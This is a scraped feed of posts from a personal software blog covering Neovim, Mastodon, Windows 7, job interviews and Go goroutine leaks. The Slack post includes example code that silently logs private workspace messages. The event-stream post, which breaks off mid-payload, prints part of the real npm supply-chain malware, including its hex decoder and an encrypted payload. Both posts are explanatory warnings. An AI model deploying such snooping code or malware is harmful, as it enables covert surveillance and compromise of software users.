zg to mark \u0026ldquo;good\u0026rdquo; words gets you 99% of the way there.\nAs with most things NeoVim, there are excellent docs and APIs for using the spell interface: https://neovim.io/doc/user/spell.html Especially if you plan to generate your own spellfiles or programmatically modify text via the spell APIs, these doc resources are a must read!\nIf you found this blog post valuable, comment below, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors. Your support means the world to me!!\n","permalink":"https://johncodes.com/posts/2023/02-25-nvim-spell/","summary":"I know.\nAny sane person\u0026rsquo;s editor already has spellchecking built in. And enabled by default. But I could never leave my beloved Neovim (and all the muscle memory I\u0026rsquo;ve built) just to spell things correctly! That\u0026rsquo;s why I became a programmer dammit! Who needs to know how to spell correctly when I can have single character variable names! Besides. We have tools. Isn\u0026rsquo;t that what computers are for!? Automate the boring stuff!","title":"NeoVim: Using the spellchecker"},{"content":" \u0026ldquo;This is the social media network of a software engineer. Not as clumsy or random as Twitter; an elegant network for a more civilized age.\u0026rdquo; ― obi-wan kenobi\nOver the last week, I\u0026rsquo;ve abandoned my Twitter account in favor of diving head first into the world of Mastodon and the \u0026ldquo;Fediverse\u0026rdquo;. So far, it\u0026rsquo;s been a surprising, delightful, and enriching experience.\nBy the time I moved to Mastodon, I had some 3,000 followers on Twitter. But the platform has atrophied and changed in many sad ways. Long gone are the days of fun technical deep dives, inside scoops on your favorite projects, and starting conversations with your technical peers. Engagement (at least for me. Maybe I\u0026rsquo;m very boring?) is way down and the platform itself is breaking: I haven\u0026rsquo;t been able to reliably access my DMs for the better part of a week.\nInstead, tech Twitter has been left with an exorbitant amount of \u0026ldquo;influencers\u0026rdquo; saying things like: \u0026ldquo;As a developer, how many hours do you sleep\u0026rdquo;, \u0026ldquo;10 reasons Next.js is the best thing since sliced bread!\u0026rdquo;, and \u0026ldquo;How to get your first tech job in 6 months!\u0026rdquo;. All shameless attempts to groom the all seeing algorithm in their favor.\nFor me, the interesting conversations had stifled and it was time to try something else. Enter Mastodon; the blessed successor to many\u0026rsquo;s beloved Twitter of a forgotten era!\nMastodon is abit weird though.\nFor one, there\u0026rsquo;s no \u0026ldquo;algorithm\u0026rdquo;. It\u0026rsquo;s just a sequential timeline of stuff from people you follow. For some who grew up in the age of never ending, dopamine dumping, slot machine scrolling, this might take awhile to get used to. But what you\u0026rsquo;ll find instead is real conversation and the ability to engage with those people directly. I don\u0026rsquo;t miss the days of inflammatory content designed to artificially drive up engagement. I\u0026rsquo;m happy it\u0026rsquo;s been replaced in my social media life with a slower, more intentional feed.\nIn that same vein, you\u0026rsquo;ll also notice that Mastodon is not a centralized place where everyone gathers to share their hot takes. Instead, it\u0026rsquo;s \u0026ldquo;federated\u0026rdquo; which means there are many different Mastodon servers and services. You can then crawl these different server instances to connect with a distributed network; they\u0026rsquo;re all interlinked. So, if I have an account on \u0026ldquo;server A\u0026rdquo;, I can still search, follow, and see content from people on \u0026ldquo;server B\u0026rdquo;. All of my content and information lives on \u0026ldquo;server A\u0026rdquo;, but through the magic of the internet and graph theory, a massive number of Mastodon servers can come together to create the great \u0026ldquo;Fediverse\u0026rdquo;; independently hosted and maintained servers that can all communicate together.\nOr not.\nIt\u0026rsquo;s also completely plausible to have a small Mastodon instance that is cut off from the Fediverse where only people internal to that instance can interact with each-other. That\u0026rsquo;s the joy of open source technology that you have the power to own, modify, and dictate the direction of.\nTo get started, you\u0026rsquo;ll need to find a server that you want to join. I picked fosstodon.org since its main focus is supporting people in the open source community. Browsing the list of indexed servers is a great way to start and find a place that makes sense for you to call home.\nFinding your Twitter network When you first get started, it can be hard trying to find people, especially if you\u0026rsquo;re coming from a large network on Twitter.\nOne of the Fediverse\u0026rsquo;s biggest downfalls is a lack of an efficient and sensible search. Because there could be any number of different web publishing platforms linked into the broader Fediverse, there\u0026rsquo;s no good way to index, search, and serve all of that distributed content at once.\nThankfully, there are a few handy tools to make this transition easier! My favorite is Twitodon. You sign in with your Twitter, sign in with your Mastodon account, and it crawls your Twitter following to find people in your existing network who have a Mastodon account. Then, you can export a CSV of your network and import it directly into Mastodon! (Don\u0026rsquo;t forget to revoke Twitodon\u0026rsquo;s access to Twitter and Mastodon once your done. Thankfully, they provide the steps necessary to do that).\nUser experience The default Mastodon user interface and experience is not amazing. And who can blame them. Mastodon is a non-profit foundation building the open source platform and hosting some of the biggest instances for pennies on the dollar. They probably have more important things to worry about (like if they should support quote Toots).\nBut, because the Fediverse is a thriving space full of tinkerers and hackers, I have a few recommendations on taking your Mastodon experience to the next level:\nIvory Tweetbot was a favorite Twitter client for many people. Tapbots, the duo who created the iOS application, lovingly curated a delightful Twitter user experience. But suddenly, a few weeks ago at the beginning of January, Twitter shut down third party client access to the API. And in one fell swoop, Tweetbot was no more. Instead of sulking, Tapbots immediately got to work shipping their Mastodon iOS client, Ivory.\nAnd wow.\nBefore Ivory, Mastodon didn\u0026rsquo;t really \u0026ldquo;make sense\u0026rdquo; for me. Now, it\u0026rsquo;s everything I hoped for; a beautiful user interface, customizable buttons and actions, and notifications that actually work. Even in it\u0026rsquo;s very early access state, it\u0026rsquo;s still a massive accomplishment.\nFor an iOS client (sorry Android people), I couldn\u0026rsquo;t recommend Ivory enough.\nElk.zone So, what about a web client? Well, let me introduce to you Elk.zone, a web client from members of the core Vue.js team.\nAnd it\u0026rsquo;s really, really good. I would argue maybe even better than the Twitter web client user experience. It\u0026rsquo;s intuitive, it makes tons of sense, it has native lite and dark mode, etc. And I shouldn\u0026rsquo;t be surprised; anytime I come across a page built with Vue, I\u0026rsquo;m always impressed by the framework\u0026rsquo;s output.\nHuge shout out to this small team for accomplishing so much in such a short time!\nIn short, as Twitter falls apart, there is a lovely home for you somewhere in the Fediverse. It\u0026rsquo;s growing day by day. And with lots of people tinkering on the platform, it\u0026rsquo;s user experience, features, and possibilities will only continue to thrive from here. I can\u0026rsquo;t wait to see you there and start a conversation: https://fosstodon.org/@johnmcbride\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/2023/01-28-the-joy-of-mastodon/","summary":"\u0026ldquo;This is the social media network of a software engineer. Not as clumsy or random as Twitter; an elegant network for a more civilized age.\u0026rdquo; ― obi-wan kenobi\nOver the last week, I\u0026rsquo;ve abandoned my Twitter account in favor of diving head first into the world of Mastodon and the \u0026ldquo;Fediverse\u0026rdquo;. So far, it\u0026rsquo;s been a surprising, delightful, and enriching experience.\nBy the time I moved to Mastodon, I had some 3,000 followers on Twitter.","title":"An elegant social media network for a more civilized age."},{"content":"Welcome to the \u0026ldquo;Sunday Edition\u0026rdquo; of my blog. This is my (occasionally) recurring weekly news letter where I highlight some interesting things from across the tech industry, share a few insights from the week, and give you a chance to catch up on some worth-while reads from around the internet.\nIf you\u0026rsquo;d like to subscribe via RSS and receive new posts, you can find the atom feed here.\nNews Microsoft ended long term support for Windows 7 this week.\nThis means that both the Windows 7 Professional and Enterprise editions will no longer receive any kind of security updates. And while “support” for Windows 7 ended in January of 2020, Microsoft has had a hard time putting this operating system down; many deeply entrenched industries (like healthcare, manufacturing, defense, and governement) still used it heavily. By some estimates, some 11% of all Windows users are still using Windows 7.\nI’d anticipate this version of Windows becoming a major target for bad actors out in the wild. Major exploits of older Windows versions have been discovered long after edtended support ended and with Windows 7 massive footprint, it remains a very high value target for many.\nIf you still use Windows 7, now is the time to update.\nGood reads from across the internet This girl is going to kill herself - Krista Diamond on Long Reads Before I got into software engineering, I worked a few summers in the outdoor rec industry as a mountain guide. I lead rock climbing trips, rafted rivers, hiked 14-ers, and bushwacked in the backcountry. And like this story from Krista Diamond reflects on, I too faced unprecedented life or death situations in the backcountry. But too often, time and time again, I would brush off my experiance as\nWe as humans are very bad at assessing risk. People don’t conceptualize statistics, especially when it pertains to them personally. Whether it’s the risk of weather on the mountain or the risk of missing delivery deadlines at work, people don’t really understand the risk until it’s usually too late.\nOne of the best ways to combat this in my own life and work is to make the risk more digestible and specific: “The backcountry is dangerous and risky” is difficult to conceptualize. But “crossing a river at peak flow while wearing your pack is dangerous and risky” is way easier to reason about. “Re-writing the entire app is risky” is difficult to conceptualize. But “re-writing the app to use a newest web framework would require we adopt a new database schema which entails doing risky and costly migrations” is easier to reason about.\nJeff Beck, Guitarist With a Chapter in Rock History, Dies at 78 - The New York Times When I was 12, I got my first guitar. I always wanted to play like my dad and my big brother. I learned the basics from my dad but then (like any teenager would), I wanted to find my own path. I would go to the local library, browse their collection of CDs, find albums with interesting enough covers, and check them out. I’d then head home, put the CD into my disc changer, pick up my guitar, and try my best to play along.\nI stumbled onto Jeff Beck’s Wired album, put it on, and was immediately introduced to Led Boots:\nI’d never heard anything like it; a mix of sweeping rock solos, complex jazz changes, nuanced beats, \u0026amp; a mixing of melody and rythmn.\nI went back to the library and I checked out ever Jeff Beck album they had. For me, his music was something very special. It was so different from any of the radio rock I’d heard before. It’s what got me interested in exploring jazz. And to one midwest teenager with a guitar, it helped inspire a lifetime love of music and creating.\nCommand line tip If you’re anything like me, you have a highly configured command line environment with alot of aliases. And sometimes, you need to escape using an alias in favor of its original intent. A good example in my environment is:\n$ which vim vim: aliased to nvim $ vim --version NVIM v0.8.2 I use NeoVim almost exclusively so the “vim” alias makes sense 99% of the time. But whenever I need actual vim, I can escape my alias using a backslash:\n$ \\vim --version VIM - Vi IMproved 7.4 (2013 Aug 10, compiled Nov 24 2016 16:44:48) This (unfortunately) won’t work on fish but is a great little backdoor alias escape for zsh, bash, etc.\n","permalink":"https://johncodes.com/posts/2023/01-14-sat-edition/","summary":"Welcome to the \u0026ldquo;Sunday Edition\u0026rdquo; of my blog. This is my (occasionally) recurring weekly news letter where I highlight some interesting things from across the tech industry, share a few insights from the week, and give you a chance to catch up on some worth-while reads from around the internet.\nIf you\u0026rsquo;d like to subscribe via RSS and receive new posts, you can find the atom feed here.\nNews Microsoft ended long term support for Windows 7 this week.","title":"So long windows 7!"},{"content":"If you\u0026rsquo;d like a view a video version of this article, check out the following:\nIn the summer of 2022, I left my job at VMware for Amazon Web Services. It was a bitter sweet journey; I loved my time at VMware and I loved working on some cutting edge things in the Kubernetes space. Even just a few months latter, the project I was working on is now completely defunct.\nThe process to getting into AWS was no easy one. But in the end, over the course of interviewing at many different companies, I landed with 4 offers. I decided to go with AWS since it was the most compelling offer and I get to work on some really cool technologies I\u0026rsquo;m excited about.\nHere are my biggest pieces of advice for landing a job and the process I did to make it happen:\n1. Study I studied alot in preparation for my interviews. Ontop of my 40hr/week job at VMware, I was studying an additional 20-30 hours a week for about 4 weeks. This meant that for awhile, in the middle of July, all I was doing was working and studying.\nBut I was very focused on how I approached my interview prep and what things I wanted to tackle:\nThe 14 Principles to Ace Any Coding interview This is my all-time favorite resource for ramping up on coding interviews. It\u0026rsquo;s just an article, but it\u0026rsquo;s a critical way to think about coding interviews and how to approach them. Since there are only 14 patterns, they are easy enough to remember but also deep enough to apply to a myriad of different questions.\nIf you can master each of these, you will be well on your way to acing your coding interview.\nGrokking the Coding Interview I used this course as a supplement to the 14 patterns. It\u0026rsquo;s actually created by the author of the 14 patterns article but has alot of interactive questions you can go through to get ramped up quickly. Unfortunately, it is quite expensive. But I found the cost to be worth it.\nIf you don\u0026rsquo;t want to pay for the course, you can find almost all the same questions on Leetcode. You just have to do some more digging and figure out some of the solutions on your own.\nBlind 75 By this point, the blind 75 have become a notorious list of Leetcode questions that constantly come up in whiteboard style interviews. But I didn\u0026rsquo;t do all of them; I only did probably 20-30 or so. And I was very selective on which ones I wanted to tackle. You\u0026rsquo;ll notice that the are broken up into different categories. In general, if you can solve 1 or 2 linked list question, you can solve almost all of them. So I started skipping the ones that seemed to repeat or overlap.\nThis compounded with the 14 patterns since I was able to apply that knowledge alongside the various data structures and algorithms identified by the blind 75 as the most important.\nCracking the Coding Interview I did open up Cracking the Coding Interview, what most would consider the bible of whiteboard style interviews. But I only refreshed myself on the most important parts, mostly the first few chapters. I had read this book in the past (I think back in 2018?), and I didn\u0026rsquo;t feel it was necessary to go through the whole thing. Again, I felt I was already getting alot of benefit from the 14 patterns and the blind 75. So, as I skimmed the book, I skipped portions I felt overlapped with material I\u0026rsquo;d already covered or was too obscure the be relevant to my study plan.\nElements of Programming Interviews in Python I love Elements of Programming Interviews. It\u0026rsquo;s very deep, has alot of well thought out solutions, and is a great way to refresh your knowledge of a chosen language (in my case, Python).\nBut it\u0026rsquo;s a bit of a double edged sword; for my study plan, it was too much and I wanted to stay focused on the 14 patterns, the blind 75, and grokking the coding interview. So, instead, I used it as supplemental material, mostly to refresh myself on python3, it\u0026rsquo;s inner workings, and some tricks that are useful during interviews.\nAll in all, if I had to only focus on 2 of these, I\u0026rsquo;d say the 14 patterns to ace any coding interview and the Blind 75 are the most important. If you can master the patterns and have a good understanding of the Blind 75 (and the various categories), then you\u0026rsquo;ll be 95% of the way there.\n2. Get a referral Leverage your network! I hit up alot of people (just to see what\u0026rsquo;s out there) and it was massively successful. I\u0026rsquo;d say my favorite interviews all came from referrals. You also get the benefit of skipping the \u0026ldquo;get to know you\u0026rdquo; recruiter call. So reach out to people on LinkedIn, previous co-workers\n3. Company values Every company, no matter how big or small, has some values they live by. At Amazon, these are the leadership principles and you will be asked behavioral style questions based on these company values.\nDo your research! Come prepared to the interview knowing the company values.\n4. Take notes I consistently took notes after each interview. This was a big win since I was doing 3-4 interviews per week. After each interview I would note who I talked to, what we talked about, any advice they gave me about the next round, etc.\n5. Open source Open source is a great way to show off your code, show off what you\u0026rsquo;ve done, and how you\u0026rsquo;ve contributed to the broader open source world.\n6. Story telling Story telling in interviews is huge. A good story conveys your impact, what you did, the result of your actions, and much much more.\nI prefer 2 story telling methods:\nSTAR method This stands for Situation. Task. Action. Result. And people at Amazon love this for interviews (and for good reason). It tells the person listen the kind of impact you had across a certain situation and what you did to remedy it through your actions.\nMan in the hole method The man in the hole story telling method is abit more nuanced. You start from a \u0026ldquo;good place\u0026rdquo; and describe how some hole is getting dug out from under you. This is essentially the \u0026ldquo;situation\u0026rdquo; from the STAR method.\nBut you keep digging and you keep digging. Until it seems that there is no way you could possibly get out of the hole.\nThen, you describe the actions you took to get you (or your team / organization) out of that hole. It\u0026rsquo;s a very powerful method for describing high impact from things you did or delivered.\nThis advice you could really apply to any interview, but going back to basics and studying hard was a really great way to do well in my interviews and land a few different offers. Hope this was helpful! Until next time!!\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/legacy/aws-job/","summary":"If you\u0026rsquo;d like a view a video version of this article, check out the following:\nIn the summer of 2022, I left my job at VMware for Amazon Web Services. It was a bitter sweet journey; I loved my time at VMware and I loved working on some cutting edge things in the Kubernetes space. Even just a few months latter, the project I was working on is now completely defunct.","title":"How I got a job at Amazon as a software engineer"},{"content":"These simple go tests check the \u0026ldquo;leaky-ness\u0026rdquo; of using channels in Go. There are two methods described here; one using both a local context, and the parent context. When tests are run against both, the LeakyAsync method runs faster, but fails the leak checker as goroutines are not resolved or cleaned up.\nIn a production system with possibly thousands of go routines being spun up, this could result in massive memory leaks and a deadlock situation in the go binary.\nit\u0026rsquo;s recommended to use the leakchecker library to determine if goroutines get cleaned up.\npackage perform import ( \u0026#34;context\u0026#34; \u0026#34;math\u0026#34; ) func Selecting(parent chan struct{}) { i := 0 for { // Selecting within the infinite loop provides // control from the parent chan. // If the parent closes, we we can exit the loop and do any cleanup select { case \u0026lt;-parent: return default: } i++ if i == math.MaxInt32 { // Simulate an error that exits the process loop break } } } func LeakyAsync(parent chan struct{}) { // Start a go routine to read and block off the parent chan. // If the parent chan closes, we can clean up within the go routine // without having to perform a \u0026#34;select\u0026#34; on each iteration // However, this go routine will never be garbage collected // if the parent chan does not close and any subsequent cleanup will // be left to leak go func(c \u0026lt;-chan struct{}) { \u0026lt;-c }(parent) i := 0 for { i++ if i == math.MaxInt32 { // Simulate an error that exits the process loop break } } } func ContextAsync(parentCtx context.Context) { // Generate a child context from a passed in parent context. // If the parent is closed or canceled, // the child will also be closed. // We can then safely start a go routine that will block on the // child\u0026#39;s Done channel yet will still continue if the parent is canceled. ctx, cancel := context.WithCancel(parentCtx) defer cancel() go func(ctx context.Context) { \u0026lt;-ctx.Done() }(ctx) i := 0 for { i++ if i == math.MaxInt32 { // Simulate an error that exits the process loop break } } } package perform import ( \u0026#34;context\u0026#34; \u0026#34;testing\u0026#34; \u0026#34;github.com/fortytw2/leaktest\u0026#34; ) func TestSelecting(t *testing.T) { leakChecker := leaktest.Check(t) c := make(chan struct{}, 1) Selecting(c) leakChecker() c \u0026lt;- struct{}{} } func BenchmarkSelecting(b *testing.B) { for n := 0; n \u0026lt; b.N; n++ { c := make(chan struct{}) Selecting(c) } } func TestLeakyAsync(t *testing.T) { leakChecker := leaktest.Check(t) c := make(chan struct{}, 1) LeakyAsync(c) leakChecker() c \u0026lt;- struct{}{} } func BenchmarkLeakyAsync(b *testing.B) { for n := 0; n \u0026lt; b.N; n++ { c := make(chan struct{}) LeakyAsync(c) } } func TestContextAsync(t *testing.T) { leakChecker := leaktest.Check(t) ctx, cancel := context.WithCancel(context.Background()) ContextAsync(ctx) leakChecker() cancel() } func BenchmarkContextAsync(b *testing.B) { for n := 0; n \u0026lt; b.N; n++ { ctx, _ := context.WithCancel(context.Background()) ContextAsync(ctx) } } Run the test suite with the leakchecker library\n❯ go test -v === RUN TestSelecting done checking leak --- PASS: TestSelecting (11.30s) === RUN TestLeakyAsync TestLeakyAsync: leaktest.go:132: leaktest: timed out checking goroutines TestLeakyAsync: leaktest.go:150: leaktest: leaked goroutine: goroutine 25 [chan receive]: perform.LeakyAsync.func1(0xc00008c1e0) /Users/jmcbride/workspace/channels-testing/perform.go:37 +0x34 created by perform.LeakyAsync /Users/jmcbride/workspace/channels-testing/perform.go:36 +0x3f --- FAIL: TestLeakyAsync (5.57s) === RUN TestContextAsync --- PASS: TestContextAsync (0.57s) Run the benchmarks with bench and benchmem to see performance\n❯ go test -v -bench=. -benchmem -run \u0026#34;Bench*\u0026#34; goos: darwin goarch: amd64 pkg: perform BenchmarkSelecting BenchmarkSelecting-8 1\t10114375732 ns/op\t104 B/op\t2 allocs/op BenchmarkLeakyAsync BenchmarkLeakyAsync-8 2\t585489776 ns/op\t704 B/op\t3 allocs/op BenchmarkContextAsync BenchmarkContextAsync-8 2\t570398894 ns/op\t976 B/op\t9 allocs/op PASS ok perform\t13.655s LeakyAsync is roughly 2 times faster. But fails the leak checker test as the goroutine is not resolved.\nSelecting is slow because it performs a select on every iteration of the for loop.\nContextAsync is the best of both worlds. We don\u0026rsquo;t have to do a select within the for loop, yet we avoid a go routine leak.\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/legacy/golang-performance/","summary":"These simple go tests check the \u0026ldquo;leaky-ness\u0026rdquo; of using channels in Go. There are two methods described here; one using both a local context, and the parent context. When tests are run against both, the LeakyAsync method runs faster, but fails the leak checker as goroutines are not resolved or cleaned up.\nIn a production system with possibly thousands of go routines being spun up, this could result in massive memory leaks and a deadlock situation in the go binary.","title":"Leaky Go Channels"},{"content":"(Note: this is from a blog archieve dated 2019/01/21. These opinions are my own and the slack API may have changed) TLDR: The Slack API exposes endpoints for a token holder to read all public and private messages.\nIn today\u0026rsquo;s world, violations of privacy are no surprise. Between all the leaks and data dumps, many people have accepted this as \u0026ldquo;just the world we live in\u0026rdquo;. But what if information was exposed that could be used to judge your work performance? Or steal your company’s intellectual property?\nIn this post, I will show how a Slack app could potentially leverage the Slack API to snoop on all public and private messages in a Slack workspace.\nThe veil of privacy A slack private message is not truly private. It is only hidden behind a thin veil of secrecy. With a workspace API token in hand, someone could lift that veil and see all.\nHere, with a short example, we will show how easily that can be done.\nFirst, the workspace owner or admin (depending on permissions), must access the Slack API website. There, they can build an app or give third party permissions to install a “marketplace” app. This is fairly straight forward and exposes several workspace tokens for the app to use. These are secret tokens, so they will be omitted in this example.\nNext, the app builder must enable the \u0026ldquo;message\u0026rdquo; workspace event. If I was a nefarious third-party app builder, I would simply request various permissions related to channel, im, or group \u0026ldquo;history\u0026rdquo;. For a full list of events and their permission scope, see this list.\nNext, if building the app, an endpoint must be designated for the API to send the event payload. This event triggers whenever a message is sent in a direct message channel or fulfills the event conditions. For a full description of the Slack API event loop, check this out.\nNow that we have the API set up to send event payloads, lets build a small Node Express app with an endpoint to receive the event json.\n// Events API endpoint app.post(\u0026#39;/events\u0026#39;, (req, res) =\u0026gt; { switch (req.body.type) { case \u0026#39;url_verification\u0026#39;: { // verifies events API endpoint res.send({ challenge: req.body.challenge }); break; } case \u0026#39;event_callback\u0026#39;: { // Respond immediately to prevent a timeout error res.sendStatus(200); const event = req.body.event; // Print the message contents if(event.type == \u0026#39;message\u0026#39;) { console.log(\u0026#39;User: \u0026#39;, event.user); console.log(\u0026#39;Text: \u0026#39;, event.text); // Do other nefarious things with events json } } } }) In this short node express endpoint, we can respond with the event token (necessary for verifying the app when challenged) and snoop on private messages. Let’s use ngork, start the express app, and send a private message:\nApp listening on port 8080! User: UBB22VCKC Text: hello world We can see that my Slack user ID is exposed and the message I sent is exposed. At this point, the app could do anything with this information.\nThis not only applies to single channel DMs, but the Slack API exposes several event subscriptions for message events in specific channels, specific groups, multiparty direct messages, private channels, and even every message sent in a workspace. The app builder simply must turn on these events request the appropriate permissions and the payload will be sent to the designated endpoint.\nIn short, it requires very little configuration and code to access and expose private Slack messages.\nWhat can you do? Be extremely mindful of the apps and permissions you give third party apps. Ask yourself basic questions about these permissions. If you are installing a fun GIF app, why dose it requires channel history permissions?\nUse Slack apps that have been made open source. Don\u0026rsquo;t hesitate to poke around a repository if you are questioning why an app requires certain permissions!\nRequest that any custom apps your Slack workspace uses are made open source.\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/legacy/slack-is-watching/","summary":"(Note: this is from a blog archieve dated 2019/01/21. These opinions are my own and the slack API may have changed) TLDR: The Slack API exposes endpoints for a token holder to read all public and private messages.\nIn today\u0026rsquo;s world, violations of privacy are no surprise. Between all the leaks and data dumps, many people have accepted this as \u0026ldquo;just the world we live in\u0026rdquo;. But what if information was exposed that could be used to judge your work performance?","title":"Slack Is Always Watching ..."},{"content":"(Note: this post is from a legacy blog dated 12/14/2018 and some content or links may have changed)\nA few weeks ago, this issue was opened on a popular Node NPM package called Event Stream. This package enables Node streams to be simpler and streamlines many I/O operations within Node. Regardless, this package is a key dependency for many other Node packages and has over 1 million downloads per week from NPM. The newly opened issue initially questioned a new, suspicious dependency that was pushed by a new, unknown maintainer. I was lucky enough to follow the community\u0026rsquo;s investigation into this issue and now, I hope to present the findings here. My goal with this piece is to hopefully shed some light on how easy it is for somebody to inject malicious code into NPM packages, the responsibility of open source maintainers, and the responsibility of the community.\nThe Malicious Code A Github user noticed that a new dependency named flatmap-stream was added to the event stream module. Through some investigative work, here is the raw code (un-minified by Github user FallingSnow) that was injected through flatmap. The flatmap module was an unknown, single author module.\n// var r = require, t = process; // function e(r) { // return Buffer.from(r, \u0026#34;hex\u0026#34;).toString() // } function decode(data) { return Buffer.from(data, \u0026#34;hex\u0026#34;).toString() } // var n = r(e(\u0026#34;2e2f746573742f64617461\u0026#34;)), // var n = require(decode(\u0026#34;2e2f746573742f64617461\u0026#34;)) // var n = require(\u0026#39;./test/data\u0026#39;) var n = [\u0026#34;75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629\u0026#34;,\u0026#34;db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4a